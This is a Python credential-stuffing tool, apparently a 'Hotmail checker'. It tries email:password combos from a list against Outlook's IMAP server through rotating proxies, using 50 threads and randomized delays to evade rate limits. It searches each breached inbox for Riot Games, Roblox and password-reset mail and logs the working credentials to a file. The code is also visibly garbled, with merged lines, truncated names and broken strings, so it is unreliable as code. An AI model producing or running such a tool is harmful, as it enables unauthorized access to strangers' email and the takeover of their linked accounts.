import imaplib
import socks
import socket
import threading
import time
import random
from colorama import Fore, init
from queue import Queue

init(autoreset=True)

# ===== CONFIG =====
THREADS = 50  # Number of concurrent checksWORDS = ["RiotGames", "Roblox", "Password Reset", "Verification", "Account"]  # Keywords to search
PROXY_LIST = "proxies.txt"  # Format: ip:port or ip:port:user:pass
COMBO_LIST = "combos.txt"  # Format
OUTPUT_FILE = "valid_emails.txt"  # Saves valid emails + subjects
TIMEOUT = 10  # IMAP timeout (seconds)
DELAY = 1  # Delay between checks (avoid rate limits)
# ==================

class HotmailChecker:
    def __init__(self):
        self.valid_count        self.lock = threading.Lock()
        self.proxy_queue = Queue()
        self.combo_queue = Queue()

    def load_proxies(self):
        try:
            with open(PROXY_LIST, "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        self.proxy_queue.put(line)
        except:
            print(F.RED + "[!] Proxy file not found. Running without proxies.")

    def load_combos(self):
        try:
            with open(COMBO_LIST, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line:
                        self.combo_queue.put(line)
        except:
            print(Fore.RED + "[!] Combo            exit()

    def set_proxy(self, proxy):
        if not proxy:
            return False
        try:
            if "@" in proxy:  # SOCKS5 with auth
                proxy_parts = proxy.split(":")
                socks.set_default_proxy(
                    socks.SOCKS5,
                    proxy_parts[0],
                    int(proxy_                    username=proxy_parts[2],
                    password=proxy_parts[3]
                )
            else:  # HTTP/SOCKS4/SOCKS5
                proxy_parts = proxy.split(":")
                if len(proxy_parts) == 2:
                    socks.set_default_proxy(
                        socks.SOCKS5 if "socks5" in proxy.lower() else socks if "socks4" in proxy.lower() else socks.HTTP,
                        proxy_parts[0],
                        int(proxy_parts[1])
                    )
            socket.socket = socks.socksocket
            return True
        except:
            return False

    def check_email(self, email, password, proxy):
        if proxy:
            if not self.set_proxy(pro False

        try:
            # Connect to Hotmail IMAP
            mail = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993, timeout=TIMEOUT)
            mail.login(email, password)
            mail.select("inbox")

            # Search for keywords
            for keyword in KEYWORDS:
                status, messages = mail.search(None'(BODY "{keyword}")')
                if status == "OK" and messages[0]:
                    # Fetch email subjects
                    for num in messages[0].split():
                        status, data = mail.fetch(num, "(BODY.PEEK[HEADER.FIELDS (SUBJECT) status == "OK":
                            subject = data[0][1].decode("utf-8", errors="ignore").split("Subject: ")[1].split("\r\n")[0]
                            with self.lock:
                                self.valid_count += 1
                                print(Fore.GREEN + f"[+] VALID | {email}: | Subject: {subject} | Keyword: {keyword}")
                                with open(OUTPUT_FILE, "a") as f:
                                    f.write(f"{email}:{password} | Subject: {subject} | Keyword: {keyword}\n")
                    break

            mail.logout()
            return True
        except imaplib.IMAP4.error as e:
            if "AFAILED" in str(e):
                print(Fore.RED + f"[-] INVALID | {email}:{password}")
            else:
                print(Fore.YELLOW + f"[!] ERROR | {email}:{password} | {str(e)}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] ERROR | {email}:{password} | {str(e False

    def worker(self):
        while True:
            combo = self.combo_queue.get()
            proxy = self.proxy_queue.get() if not self.proxy_queue.empty() else None

            email, password = combo.split(":", 1)
            self.check_email(email, password, proxy)

            if not self.proxy_queue.empty():
                self.proxy_queue.put(proxy)  # Rot            time.sleep(DELAY + random.uniform(0, 1))  # Random delay
            self.combo_queue.task_done()

    def start(self):
        self.load_proxies()
        self.load_combos()

        print(Fore.CYAN + f"[*] Loaded {selfsize()} combos.")
        print(Fore.CYAN + f"[*] Loaded {self.proxy_queue.qsize()} proxies.")
        print(Fore.CYAN + f"[*] Starting {THREADS} threads...")

        for _ in range(THREADS):
            threading.Thread(target=self.worker, daemon=True).start()
        self.combo_queue.join()

        print(Fore.G"[+] Finished! Valid emails: {self.valid_count}")

if __name__ == "__main__":
    checker = HotmailChecker()
    checker.start()
